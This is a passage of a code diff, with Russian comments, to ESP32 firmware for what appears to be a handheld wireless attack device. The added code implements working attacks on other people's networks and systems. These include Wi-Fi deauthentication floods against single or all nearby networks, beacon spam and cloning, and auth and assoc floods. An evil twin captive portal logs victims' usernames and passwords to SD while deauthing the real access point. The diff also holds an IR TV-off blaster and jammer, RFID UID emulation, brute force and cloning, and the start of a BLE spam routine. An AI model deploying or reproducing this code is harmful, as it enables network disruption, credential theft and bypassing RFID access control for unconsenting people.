   canvas.print("%");
   canvas.setTextSize(1);
-  // Рисуем полоску
   int barWidth = map(backlightBrightness, 0, 255, 0, 100);
   canvas.drawRect(14, 70, 100, 12, accentColor);
   canvas.fillRect(15, 71, barWidth, 10, accentColor);
@@ -694,7 +938,7 @@ void drawBrightnessPage() {
 }
 
 // ======================================================================
-// 16. ИГРЫ (PONG) 
+// 9. ИГРЫ (PONG)
 // ======================================================================
 void resetPongGameState() {
   pongState.playerY = 50;
@@ -774,7 +1018,35 @@ void renderPongGameLoop(bool isUp, bool isDown, bool isOk) {
 }
 
 // ======================================================================
-// 17. IR МОДУЛЬ 
+// РЕЖИМ РАДАРА (Wi-Fi сканер с визуализацией)
+// ======================================================================
+void drawRadarPage() {
+  drawHeaderBar("WIFI RADAR");
+  canvas.setTextColor(COLOR_WHITE);
+  canvas.setCursor(5, 30);
+  canvas.print("Scanning air...");
+  canvasFlush();
+
+  radar.updateTargets(); // <-- первое сканирование
+
+  while (digitalRead(BTN_ESC) == HIGH) {
+    radar.draw(canvas, accentColor);
+    canvas.setTextColor(COLOR_WHITE);
+    canvas.setCursor(2, 118);
+    canvas.print("ESC:Exit");
+    canvasFlush();
+    updateBuzzer();
+    delay(50);  // <-- эта задержка нормальная
+    yield();
+  }
+
+  wirelessCurrentSubPage = 0;
+  wifiAttackSubPage = 0;
+  redrawFlag = true;
+}
+
+// ======================================================================
+// 10. IR МОДУЛЬ
 // ======================================================================
 void drawIrConsolePage() {
   drawHeaderBar("IR CONSOLE (RX/TX)");
@@ -804,61 +1076,12 @@ void drawIrConsolePage() {
   canvasFlush();
 }
 
-void runClassicTvBGoneLoop() {
-  drawHeaderBar("CLASSIC TV-B-GONE");
-  canvas.setTextColor(COLOR_YELLOW);
-  canvas.setCursor(5, 25);
-  canvas.print("ATTACK ACTIVE!");
-  canvas.setTextColor(COLOR_WHITE);
-  canvas.setCursor(5, 40);
-  canvas.print("Transmitting codes...");
-  canvasFlush();
-  for (uint8_t i = 0; i < TV_B_GONE_TOTAL_CODES; i++) {
-    if (digitalRead(BTN_ESC) == LOW) {
-      drawHeaderBar("TV-B-GONE");
-      canvas.setTextColor(COLOR_RED);
-      canvas.setCursor(5, 50);
-      canvas.print("Attack Canceled!");
-      canvasFlush();
-      delay(800);
-      return;
-    }
-    const IrCodeEntry &entry = tvBGoneDatabase[i];
-    canvas.fillRect(0, 55, 128, 55, COLOR_BLACK);
-    canvas.setTextColor(COLOR_CYAN);
-    canvas.setCursor(5, 60);
-    canvas.printf("Code %d/%d", i + 1, TV_B_GONE_TOTAL_CODES);
-    canvas.setTextColor(COLOR_GREEN);
-    canvas.setCursor(5, 75);
-    canvas.print(entry.brandName);
-    canvas.setTextColor(COLOR_DARKGREY);
-    canvas.setCursor(5, 90);
-    canvas.printf("0x%08X", entry.code);
-    drawFooterBar("ESC: Stop Attack");
-    canvasFlush();
-    irsend.send(entry.protocol, entry.code, entry.bits);
-    delay(120);
-  }
-  drawHeaderBar("TV-B-GONE");
-  canvas.setTextColor(COLOR_GREEN);
-  canvas.setCursor(5, 50);
-  canvas.print("ALL CODES SENT!");
-  canvas.setTextColor(COLOR_WHITE);
-  canvas.setCursor(5, 70);
-  canvas.print("Press OK to repeat");
-  drawFooterBar("OK:Repeat ESC:Back");
-  canvasFlush();
-}
-
 void processIrRxTask() {
   if (irrecv.decode(&irResults)) {
     activeIrSignal.type = irResults.decode_type;
     activeIrSignal.value = irResults.value;
     activeIrSignal.bits = irResults.bits;
     activeIrSignal.valid = true;
-    if (activeCurrentPage == 3 && irCurrentSubPage == 1) {
-      redrawFlag = true;
-    }
     irrecv.resume();
   }
 }
@@ -937,6 +1160,53 @@ void saveIrSignalToSdList(decode_type_t proto, uint64_t val, uint16_t bits) {
   drawIrConsolePage();
 }
 
+void runClassicTvBGoneLoop() {
+  drawHeaderBar("CLASSIC TV-B-GONE");
+  canvas.setTextColor(COLOR_YELLOW);
+  canvas.setCursor(5, 25);
+  canvas.print("ATTACK ACTIVE!");
+  canvas.setTextColor(COLOR_WHITE);
+  canvas.setCursor(5, 40);
+  canvas.print("Transmitting codes...");
+  canvasFlush();
+  for (uint8_t i = 0; i < TV_B_GONE_TOTAL_CODES; i++) {
+    if (digitalRead(BTN_ESC) == LOW) {
+      drawHeaderBar("TV-B-GONE");
+      canvas.setTextColor(COLOR_RED);
+      canvas.setCursor(5, 50);
+      canvas.print("Attack Canceled!");
+      canvasFlush();
+      delay(800);
+      return;
+    }
+    const IrCodeEntry &entry = tvBGoneDatabase[i];
+    canvas.fillRect(0, 55, 128, 55, COLOR_BLACK);
+    canvas.setTextColor(COLOR_CYAN);
+    canvas.setCursor(5, 60);
+    canvas.printf("Code %d/%d", i + 1, TV_B_GONE_TOTAL_CODES);
+    canvas.setTextColor(COLOR_GREEN);
+    canvas.setCursor(5, 75);
+    canvas.print(entry.brandName);
+    canvas.setTextColor(COLOR_DARKGREY);
+    canvas.setCursor(5, 90);
+    canvas.printf("0x%08X", entry.code);
+    drawFooterBar("ESC: Stop Attack");
+    canvasFlush();
+    irsend.send(entry.protocol, entry.code, entry.bits);
+    updateBuzzer();
+    delay(120);
+  }
+  drawHeaderBar("TV-B-GONE");
+  canvas.setTextColor(COLOR_GREEN);
+  canvas.setCursor(5, 50);
+  canvas.print("ALL CODES SENT!");
+  canvas.setTextColor(COLOR_WHITE);
+  canvas.setCursor(5, 70);
+  canvas.print("Press OK to repeat");
+  drawFooterBar("OK:Repeat ESC:Back");
+  canvasFlush();
+}
+
 void runIrJammer() {
   if (!irJammerActive) return;
   drawHeaderBar("IR JAMMER");
@@ -948,27 +1218,28 @@ void runIrJammer() {
   canvas.print("Sending 38kHz bursts...");
   drawFooterBar("ESC to Stop");
   canvasFlush();
-  while (true) {
-    if (digitalRead(BTN_ESC) == LOW || !irJammerActive) {
-      drawHeaderBar("IR JAMMER");
-      canvas.setTextColor(COLOR_RED);
-      canvas.setCursor(5, 50);
-      canvas.print("Stopped.");
-      canvasFlush();
-      delay(800);
+  unsigned long nextSend = millis();
+  while (irJammerActive) {
+    if (digitalRead(BTN_ESC) == LOW) {
+      irJammerActive = false;
       break;
     }
-    irsend.sendNEC(0x20DF10EF, 32);
-    delay(50);
-    irsend.sendNEC(0xE0E040BF, 32);
-    delay(50);
+    if (millis() - nextSend >= 50) {
+      nextSend = millis();
+      irsend.sendNEC(0x20DF10EF, 32);
+      irsend.sendNEC(0xE0E040BF, 32);
+    }
+    updateBuzzer();
     yield();
   }
+  drawHeaderBar("IR JAMMER");
+  canvas.setTextColor(COLOR_RED);
+  canvas.setCursor(5, 50);
+  canvas.print("Stopped.");
+  canvasFlush();
+  delay(800);
 }
 
-// ======================================================================
-// 18. СОХРАНЁННЫЕ ИК-СИГНАЛЫ 
-// ======================================================================
 void loadIrSignalList() {
   savedIrCount = 0;
   if (!isSdCardAvailable) return;
@@ -985,6 +1256,7 @@ void loadIrSignalList() {
     if (line.length() > 0) {
       savedIrList[savedIrCount++] = line;
     }
+    updateBuzzer();
   }
   file.close();
   digitalWrite(SD_CS, HIGH);
@@ -1094,25 +1366,46 @@ void drawIrSavedListPage() {
   canvasFlush();
 }
 
-// ======================================================================
-// 19. RFID PN532
-// ======================================================================
-void initializeRfidHardware() {
-  Wire.begin(PN532_SDA, PN532_SCL);
-  Wire.setClock(100000);
-  Wire.setTimeOut(20);
-  nfc.begin();
-  uint32_t verData = nfc.getFirmwareVersion();
-  if (verData) {
-    nfc.SAMConfig();
-    isRfidAvailable = true;
-    Serial.println("[PN532] Hardware OK");
-  } else {
-    isRfidAvailable = false;
-    Serial.println("[PN532] Not responding");
-  }
+
+
+void drawBuzzerPage() {
+  drawHeaderBar("BUZZER");
+  canvas.setTextColor(COLOR_WHITE);
+  canvas.setCursor(5, 30);
+  canvas.print("Screen sound:");
+  canvas.setTextColor(buzzerEnabled ? COLOR_GREEN : COLOR_RED);
+  canvas.setCursor(85, 30);
+  canvas.print(buzzerEnabled ? "ON" : "OFF");
+
+  canvas.setTextColor(COLOR_WHITE);
+  canvas.setCursor(5, 45);
+  canvas.print("Volume:");
+  int percent = map(buzzerVolume, 0, 255, 0, 100);
+  canvas.setTextColor(COLOR_YELLOW);
+  canvas.setTextSize(2);
+  canvas.setCursor(60, 41);
+  canvas.print(percent);
+  canvas.print("%");
+  canvas.setTextSize(1);
+
+  int barWidth = map(percent, 0, 100, 0, 100);
+  canvas.drawRect(14, 65, 100, 12, accentColor);
+  canvas.fillRect(15, 66, barWidth, 10, accentColor);
+
+  canvas.setTextColor(COLOR_CYAN);
+  canvas.setCursor(10, 90);
+  canvas.print("UP/DN: Volume");
+  canvas.setCursor(10, 100);
+  canvas.print("OK: Toggle  ESC: Save");
+  drawFooterBar("OK:Toggle ESC:Exit");
+  canvasFlush();
 }
 
+// ======================================================================
+// RFID – ФУНКЦИИ ДЛЯ РАБОТЫ С PN532
+// ======================================================================
+
+// ---- Отрисовка страницы чтения ----
 void drawRfidReadPage() {
   drawHeaderBar("READ & SAVE TAG");
   canvas.setTextColor(COLOR_WHITE);
@@ -1130,6 +1423,7 @@ void drawRfidReadPage() {
   canvasFlush();
 }
 
+// ---- Сканирование метки ----
 void executeRfidTagScan() {
   if (!isRfidAvailable) {
     initializeRfidHardware();
@@ -1151,6 +1445,7 @@ void executeRfidTagScan() {
     for (uint8_t i = 0; i < uidLength; i++) {
       pos += snprintf(activeRfidUidHex + pos, sizeof(activeRfidUidHex) - pos,
                       "%02X%s", uid[i], (i < uidLength - 1) ? ":" : "");
+                      updateBuzzer();
     }
   } else {
     snprintf(activeRfidUidHex, sizeof(activeRfidUidHex), "No Tag Found");
@@ -1158,6 +1453,7 @@ void executeRfidTagScan() {
   drawRfidReadPage();
 }
 
+// ---- Сохранение активного UID во Flash и SD ----
 void saveActiveRfidToStorage() {
   if (strcmp(activeRfidUidHex, "None") == 0 || strcmp(activeRfidUidHex, "No Tag Found") == 0) {
     drawHeaderBar("ERROR");
@@ -1177,6 +1473,7 @@ void saveActiveRfidToStorage() {
       targetSlot = i;
       break;
     }
+    updateBuzzer();
   }
   if (targetSlot == -1) targetSlot = 0;
   writeUidToFlashSlot(targetSlot, activeRfidUidHex);
@@ -1190,6 +1487,7 @@ void saveActiveRfidToStorage() {
   drawRfidReadPage();
 }
 
+// ---- Эмуляция активного UID ----
 void emulateActiveRfidUid() {
   if (!isRfidAvailable) {
     initializeRfidHardware();
@@ -1228,6 +1526,7 @@ void emulateActiveRfidUid() {
   };
   while (digitalRead(BTN_ESC) == HIGH) {
     nfc.sendCommandCheckAck(cmd, sizeof(cmd), 100);
+    updateBuzzer();
     delay(100);
     yield();
   }
@@ -1240,6 +1539,7 @@ void emulateActiveRfidUid() {
   delay(1000);
 }
 
+// ---- Отрисовка страницы записи UID ----
 void drawRfidWriteUidPage() {
   drawHeaderBar("WRITE UID (CUID)");
   canvas.setTextColor(COLOR_WHITE);
@@ -1258,6 +1558,7 @@ void drawRfidWriteUidPage() {
   canvasFlush();
 }
 
+// ---- Запись UID на CUID-метку ----
 void writeUidToCuidTag() {
   if (!isRfidAvailable) return;
   if (strlen(activeRfidUidHex) < 8 || strcmp(activeRfidUidHex, "No Tag Found") == 0) {
@@ -1313,6 +1614,7 @@ void writeUidToCuidTag() {
   drawRfidWriteUidPage();
 }
 
+// ---- Отрисовка страницы записи пользовательского блока ----
 void drawRfidWriteCustomBlockPage() {
   drawHeaderBar("WRITE BLOCK DATA");
   canvas.setTextColor(COLOR_WHITE);
@@ -1332,6 +1634,7 @@ void drawRfidWriteCustomBlockPage() {
   canvasFlush();
 }
 
+// ---- Запись данных в произвольный блок ----
 void writeDataToCustomBlock() {
   if (!isRfidAvailable) return;
   drawHeaderBar("WRITING BLOCK...");
@@ -1369,6 +1672,7 @@ void writeDataToCustomBlock() {
   drawRfidWriteCustomBlockPage();
 }
 
+// ---- Отрисовка страницы стирания блока ----
 void drawRfidErasePage() {
   drawHeaderBar("ERASE TAG BLOCK");
   canvas.setTextColor(COLOR_WHITE);
@@ -1388,6 +1692,7 @@ void drawRfidErasePage() {
   canvasFlush();
 }
 
+// ---- Очистка блока (запись нулей) ----
 void eraseDataOnCustomBlock() {
   if (!isRfidAvailable) return;
   drawHeaderBar("ERASING BLOCK...");
@@ -1425,6 +1730,7 @@ void eraseDataOnCustomBlock() {
   drawRfidErasePage();
 }
 
+// ---- Отрисовка сохранённых UID ----
 void drawSavedRfidPage() {
   drawHeaderBar("FLASH UID STORAGE");
   if (rfidSavedSlotIndex < rfidSavedScrollOffset) rfidSavedScrollOffset = rfidSavedSlotIndex;
@@ -1444,11 +1750,13 @@ void drawSavedRfidPage() {
     }
     canvas.setCursor(5, y);
     canvas.printf("%d:%s", idx, buf);
+    updateBuzzer();
   }
   drawFooterBar("OK:Select DN:Delete");
   canvasFlush();
 }
 
+// ---- Брутфорс UID (эмуляция всех возможных) ----
 void bruteForceRfid() {
   drawHeaderBar("BRUTEFORCE RFID");
   canvas.setTextColor(COLOR_YELLOW);
@@ -1492,6 +1800,7 @@ void bruteForceRfid() {
       delay(800);
       return;
     }
+    updateBuzzer();
     yield();
   }
   drawHeaderBar("BRUTEFORCE");
@@ -1503,8 +1812,35 @@ void bruteForceRfid() {
 }
 
 // ======================================================================
-// 20. WIFI & BLE 
+// 12. Wi-Fi ФУНКЦИИ
 // ======================================================================
+void executeWiFiScan() {
+  drawHeaderBar("SCANNING WIFI...");
+  canvas.setTextColor(COLOR_CYAN);
+  canvas.setCursor(10, 50);
+  canvas.print("Scanning airwaves...");
+  canvasFlush();
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  delay(100);
+  int16_t foundNets = WiFi.scanNetworks(false, false, false, 300);
+  wifiScannedCount = 0;
+  if (foundNets > 0) {
+    if (foundNets > 12) foundNets = 12;
+    wifiScannedCount = foundNets;
+    for (int i = 0; i < foundNets; i++) {
+      snprintf(scannedNetworks[i].ssid, sizeof(scannedNetworks[i].ssid), "%s", WiFi.SSID(i).c_str());
+      scannedNetworks[i].rssi = WiFi.RSSI(i);
+      scannedNetworks[i].channel = WiFi.channel(i);
+      memcpy(scannedNetworks[i].bssid, WiFi.BSSID(i), 6);
+      updateBuzzer();
+    }
+  }
+  wifiSelectedIndex = 0;
+  wifiScrollOffset = 0;
+  drawWiFiScanPage();
+}
+
 void drawWiFiScanPage() {
   drawHeaderBar("WIFI SCANNER");
   if (wifiScannedCount == 0) {
@@ -1513,8 +1849,8 @@ void drawWiFiScanPage() {
     canvas.print("No Nets Scanned.");
     canvas.setCursor(10, 60);
     canvas.setTextColor(COLOR_WHITE);
-    canvas.print("Press OK to scan");
-    drawFooterBar("OK: Scan Nets ESC:Back");
+    canvas.print("Press DOWN to scan");
+    drawFooterBar("DN:Scan  OK:Attack  ESC:Back");
     canvasFlush();
     return;
   }
@@ -1535,151 +1871,364 @@ void drawWiFiScanPage() {
     canvas.setCursor(100, lineY);
     canvas.print(scannedNetworks[netIdx].rssi);
   }
-  drawFooterBar("OK:Select DN:Scan");
+  drawFooterBar("DN:Scan  OK:Attack  ESC:Back");
   canvasFlush();
 }
 
-void executeWiFiScan() {
-  drawHeaderBar("SCANNING WIFI...");
-  canvas.setTextColor(COLOR_CYAN);
-  canvas.setCursor(10, 50);
-  canvas.print("Scanning airwaves...");
-  canvasFlush();
-  WiFi.mode(WIFI_STA);
-  WiFi.disconnect();
-  delay(100);
-  int16_t foundNets = WiFi.scanNetworks(false, false, false, 300);
-  wifiScannedCount = 0;
-  if (foundNets > 0) {
-    if (foundNets > 12) foundNets = 12;
-    wifiScannedCount = foundNets;
-    for (int i = 0; i < foundNets; i++) {
-      snprintf(scannedNetworks[i].ssid, sizeof(scannedNetworks[i].ssid), "%s", WiFi.SSID(i).c_str());
-      scannedNetworks[i].rssi = WiFi.RSSI(i);
-      scannedNetworks[i].channel = WiFi.channel(i);
-      memcpy(scannedNetworks[i].bssid, WiFi.BSSID(i), 6);
-    }
-  }
-  wifiSelectedIndex = 0;
-  wifiScrollOffset = 0;
-  drawWiFiScanPage();
+void drawAttackChoiceMenu() {
+  String title = "ATTACK ON " + String(scannedNetworks[wifiSelectedIndex].ssid);
+  drawGenericSubMenu(title.c_str(), attackChoiceList, ATTACK_CHOICE_COUNT, wifiAttackChoice, wifiAttackScroll);
 }
 
-void drawBeaconSpamPage() {
-  drawHeaderBar("BEACON SPAMMERS");
-  canvas.setTextColor(COLOR_WHITE);
-  canvas.setCursor(5, 25);
-  canvas.print("Mode: Random SSID Spam");
-  canvas.setCursor(5, 45);
-  if (isBeaconSpamActive) {
-    canvas.setTextColor(COLOR_GREEN);
-    canvas.setTextSize(2);
-    canvas.print("ACTIVE!");
-    canvas.setTextSize(1);
-    canvas.setTextColor(COLOR_WHITE);
-    canvas.setCursor(5, 70);
-    canvas.print("Flooding 2.4GHz Air...");
-  } else {
-    canvas.setTextColor(COLOR_RED);
-    canvas.setTextSize(2);
-    canvas.print("DISABLED");
-    canvas.setTextSize(1);
-    canvas.setCursor(5, 75);
-    canvas.setTextColor(COLOR_CYAN);
-    canvas.print("OK: Enable Flood");
-  }
-  drawFooterBar("OK:Toggle Attack");
-  canvasFlush();
+// Базовые функции для отправки кадров
+void wifi_random_mac(uint8_t *mac) {
+  for (int i = 0; i < 6; i++) mac[i] = random(0x00, 0xFF); updateBuzzer();
+  mac[0] = (mac[0] & 0xFE) | 0x02;
 }
 
-void sendBeaconRawFrame(const char* ssid, uint8_t chan) {
-  uint8_t beaconPacket[128] = {
-    0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-    0x00, 0x22, 0x44, 0x66, 0x88, 0xAA, 0x00, 0x22, 0x44, 0x66, 0x88, 0xAA,
-    0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x11, 0x00,
-    0x00, (uint8_t)strlen(ssid)
-  };
-  int packetLength = 38;
-  memcpy(&beaconPacket[packetLength], ssid, strlen(ssid));
-  packetLength += strlen(ssid);
-  beaconPacket[packetLength++] = 0x03;
-  beaconPacket[packetLength++] = 0x01;
-  beaconPacket[packetLength++] = chan;
-  esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, packetLength, false);
-}
-
-void tickBeaconSpamTask() {
-  if (!isBeaconSpamActive) return;
-  char ssid[21];
-  int len = random(6, 20);
-  const char chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-  for (int i = 0; i < len; i++) {
-    ssid[i] = chars[random(0, sizeof(chars) - 1)];
-  }
-  ssid[len] = '\0';
-  sendBeaconRawFrame(ssid, random(1, 12));
-  delay(10);
-}
-
-void drawDeauthPage() {
-  drawHeaderBar("WIFI DEAUTHER");
-  if (wifiScannedCount == 0) {
-    canvas.setTextColor(COLOR_RED);
-    canvas.setCursor(10, 45);
-    canvas.print("Go back & Scan first!");
-    drawFooterBar("ESC: Go Back");
-    canvasFlush();
-    return;
-  }
-  WiFiNetwork target = scannedNetworks[wifiSelectedIndex];
-  canvas.setTextColor(COLOR_WHITE);
-  canvas.setCursor(5, 23);
-  canvas.print("Target: ");
-  canvas.setTextColor(COLOR_YELLOW);
-  canvas.print(target.ssid);
-  canvas.setCursor(5, 37);
-  canvas.setTextColor(COLOR_WHITE);
-  canvas.printf("Channel: %d", target.channel);
-  canvas.setCursor(5, 52);
-  if (deauthActive) {
-    canvas.setTextColor(COLOR_GREEN);
-    canvas.print("JAMMING ACTIVE!");
-    canvas.setCursor(5, 70);
-    canvas.setTextColor(COLOR_RED);
-    canvas.print("Flooding Deauth frame..");
-  } else {
-    canvas.setTextColor(COLOR_RED);
-    canvas.print("JAMMING IDLE");
-    canvas.setCursor(5, 75);
-    canvas.setTextColor(COLOR_CYAN);
-    canvas.print("OK: KICK NETWORK!");
-  }
-  drawFooterBar("OK:Toggle Attack");
-  canvasFlush();
-}
-
-void sendDeauthRawFrame(uint8_t* targetMac, uint8_t channel) {
-  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+void wifi_send_deauth(uint8_t* bssid, uint8_t* dst, uint16_t reason) {
+  if (dst == nullptr) dst = (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF";
   uint8_t deauthPacket[26] = {
     0xC0, 0x00, 0x00, 0x00,
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-    targetMac[0], targetMac[1], targetMac[2], targetMac[3], targetMac[4], targetMac[5],
-    targetMac[0], targetMac[1], targetMac[2], targetMac[3], targetMac[4], targetMac[5],
+    dst[0], dst[1], dst[2], dst[3], dst[4], dst[5],
+    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
+    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
     0x00, 0x00,
-    0x07, 0x00
+    reason & 0xFF, (reason >> 8) & 0xFF
   };
   esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, 26, false);
 }
 
+void wifi_send_beacon(uint8_t* src, uint8_t* dst, const char* ssid, bool withRSN) {
+  if (dst == nullptr) dst = (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF";
+  uint8_t beacon[128] = {
+    0x80, 0x00, 0x00, 0x00,
+    dst[0], dst[1], dst[2], dst[3], dst[4], dst[5],
+    src[0], src[1], src[2], src[3], src[4], src[5],
+    src[0], src[1], src[2], src[3], src[4], src[5],
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x64, 0x00, 0x11, 0x00
+  };
+  int len = 38;
+  beacon[len++] = 0x00;
+  int ssidLen = strlen(ssid);
+  beacon[len++] = ssidLen;
+  memcpy(beacon + len, ssid, ssidLen);
+  len += ssidLen;
+  if (withRSN) {
+    uint8_t rsn[] = {0x30, 0x14, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02, 0x00, 0x00};
+    memcpy(beacon + len, rsn, sizeof(rsn));
+    len += sizeof(rsn);
+  }
+  esp_wifi_80211_tx(WIFI_IF_AP, beacon, len, false);
+}
+
+void wifi_send_assoc(uint8_t* src, uint8_t* bssid, const char* ssid, uint16_t seq) {
+  uint8_t assoc[64] = {
+    0x00, 0x00, 0x00, 0x00,
+    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
+    src[0], src[1], src[2], src[3], src[4], src[5],
+    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
+    0x00, 0x00,
+    0x01, 0x00, 0x0A, 0x00,
+    0x00, (uint8_t)strlen(ssid)
+  };
+  int len = 28;
+  memcpy(assoc + len, ssid, strlen(ssid));
+  len += strlen(ssid);
+  assoc[len++] = 0x01;
+  assoc[len++] = 0x01;
+  assoc[len++] = 0x8C;
+  esp_wifi_80211_tx(WIFI_IF_STA, assoc, len, false);
+}
+
+void wifi_send_auth(uint8_t* src, uint8_t* bssid, uint16_t seq) {
+  uint8_t auth[30] = {
+    0xB0, 0x00, 0x3A, 0x01,
+    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
+    src[0], src[1], src[2], src[3], src[4], src[5],
+    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
+    0x00, 0x00,
+    0x00, 0x00, 0x01, 0x00, 0x00, 0x00
+  };
+  esp_wifi_80211_tx(WIFI_IF_STA, auth, 30, false);
+}
+
+// Атаки
+void runDeauthAttack(bool all) {
+  if (wifiScannedCount == 0) { showPopup("Scan networks first"); return; }
+  std::vector<int> targets;
+  if (all) {
+    for (int i = 0; i < wifiScannedCount; i++) targets.push_back(i);
+  } else {
+    if (wifiSelectedIndex < 0 || wifiSelectedIndex >= wifiScannedCount) return;
+    targets.push_back(wifiSelectedIndex);
+  }
+  drawHeaderBar("DEAUTH ATTACK");
+  canvas.setTextColor(COLOR_GREEN);
+  canvas.setCursor(5, 25);
+  canvas.printf("Targets: %d", targets.size());
+  canvas.setCursor(5, 45);
+  canvas.print("Press ESC to stop");
+  canvasFlush();
+
+  unsigned long attackStart = millis();
+  bool stop = false;
+  while (!stop) {
+    for (int idx : targets) {
+      if (digitalRead(BTN_ESC) == LOW) { stop = true; break; }
+      int ch = scannedNetworks[idx].channel;
+      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+      for (int f = 0; f < framesPerDeauth; f++) {
+        wifi_send_deauth(scannedNetworks[idx].bssid, (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF", 2);
+        delay(sendDelay);
+        yield();
+        esp_task_wdt_reset();
+        if (digitalRead(BTN_ESC) == LOW) { stop = true; break; }
+      }
+    }
+    updateBuzzer();
+    if (millis() - attackStart > 60000) stop = true; // таймаут 60 сек
+  }
+  showPopup("Deauth stopped");
+}
+
+void runBeaconAttack(bool clone) {
+  if (wifiScannedCount == 0) { showPopup("Scan networks first"); return; }
+  if (clone && (wifiSelectedIndex < 0 || wifiSelectedIndex >= wifiScannedCount)) { showPopup("Select target first"); return; }
+  drawHeaderBar(clone ? "BEACON CLONE" : "BEACON SPAM");
+  canvas.setTextColor(COLOR_GREEN);
+  canvas.setCursor(5, 25);
+  canvas.print("Press ESC to stop");
+  canvasFlush();
+  uint8_t src[6];
+  unsigned long nextSend = millis();
+  while (digitalRead(BTN_ESC) == HIGH) {
+    if (millis() - nextSend >= 50) { // частота 20 Гц
+      nextSend = millis();
+      wifi_random_mac(src);
+      if (clone) {
+        String ssid = String(scannedNetworks[wifiSelectedIndex].ssid);
+        for (int i = 0; i < maxClone; i++) ssid += " ";
+        esp_wifi_set_channel(scannedNetworks[wifiSelectedIndex].channel, WIFI_SECOND_CHAN_NONE);
+        for (int f = 0; f < framesPerBeacon; f++)
+          wifi_send_beacon(src, (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid.c_str(), true);
+      } else {
+        String ssid = generateRandomString(10);
+        for (int i = 0; i < maxSpamSpace; i++) ssid += " ";
+        esp_wifi_set_channel(random(1, 12), WIFI_SECOND_CHAN_NONE);
+        for (int f = 0; f < framesPerBeacon; f++)
+          wifi_send_beacon(src, (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid.c_str(), false);
+      }
+      yield();
+      esp_task_wdt_reset();
+    }
+    updateBuzzer();
+    yield();
+  }
+  showPopup("Beacon stopped");
+}
+
+void runAssocAuthAttack(bool auth) {
+  if (wifiSelectedIndex < 0 || wifiSelectedIndex >= wifiScannedCount) { showPopup("Select target first"); return; }
+  uint8_t* bssid = scannedNetworks[wifiSelectedIndex].bssid;
+  int ch = scannedNetworks[wifiSelectedIndex].channel;
+  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+  uint16_t seq = 0;
+  drawHeaderBar(auth ? "AUTH FLOOD" : "ASSOC FLOOD");
+  canvas.setTextColor(COLOR_GREEN);
+  canvas.setCursor(5, 25);
+  canvas.print("Press ESC to stop");
+  canvasFlush();
+  unsigned long nextSend = millis();
+  while (digitalRead(BTN_ESC) == HIGH) {
+    if (millis() - nextSend >= 10) {
+      nextSend = millis();
+      uint8_t src[6]; wifi_random_mac(src);
+      if (auth)
+        wifi_send_auth(src, bssid, seq++);
+      else
+        wifi_send_assoc(src, bssid, scannedNetworks[wifiSelectedIndex].ssid, seq++);
+      yield();
+      esp_task_wdt_reset();
+    }
+    updateBuzzer();
+    yield();
+  }
+  showPopup("Attack stopped");
+}
+
+void runEvilTwin() {
+  if (wifiSelectedIndex < 0 || wifiSelectedIndex >= wifiScannedCount) { showPopup("Select target first"); return; }
+  String targetSSID = scannedNetworks[wifiSelectedIndex].ssid;
+  strncpy(evilPortalSsid, targetSSID.c_str(), sizeof(evilPortalSsid) - 1);
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP(evilPortalSsid);
+  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
+  webServer.on("/login", HTTP_POST, []() {
+    String u = webServer.hasArg("user") ? webServer.arg("user") : "unknown";
+    String p = webServer.hasArg("pass") ? webServer.arg("pass") : "empty";
+    appendCredToSd(u, p);
+    lastCapturedCred = u + " / " + p;
+    capturedCredsCount++;
+    webServer.send(200, "text/html", "<html><body><h2>Success</h2></body></html>");
+  });
+  webServer.onNotFound([]() { webServer.send(200, "text/html", EVIL_PORTAL_HTML); });
+  webServer.begin();
+  uint8_t* bssid = scannedNetworks[wifiSelectedIndex].bssid;
+  int ch = scannedNetworks[wifiSelectedIndex].channel;
+  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+  drawHeaderBar("EVIL TWIN ACTIVE");
+  canvas.setTextColor(COLOR_GREEN);
+  canvas.setCursor(5, 25);
+  canvas.printf("SSID: %s", evilPortalSsid);
+  canvas.setCursor(5, 45);
+  canvas.print("Press ESC to stop");
+  canvasFlush();
+  while (digitalRead(BTN_ESC) == HIGH) {
+    wifi_send_deauth(bssid, (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF", 2);
+    dnsServer.processNextRequest();
+    webServer.handleClient();
+    delay(50);
+    yield();
+    esp_task_wdt_reset();
+  }
+  webServer.stop();
+  dnsServer.stop();
+  WiFi.softAPdisconnect(true);
+  WiFi.mode(WIFI_OFF);
+  showPopup("Evil Twin stopped");
+}
+
+void runSourApple() {
+  drawHeaderBar("SOUR APPLE BLE");
+  canvas.setTextColor(COLOR_GREEN);
+  canvas.setCursor(5, 25);
+  canvas.print("BLE Spam Active!");
+  canvas.setCursor(5, 45);
+  canvas.print("Press ESC to stop");
+  canvasFlush();
+
+  // 1. Полностью отключаем Wi-Fi, чтобы освободить радио
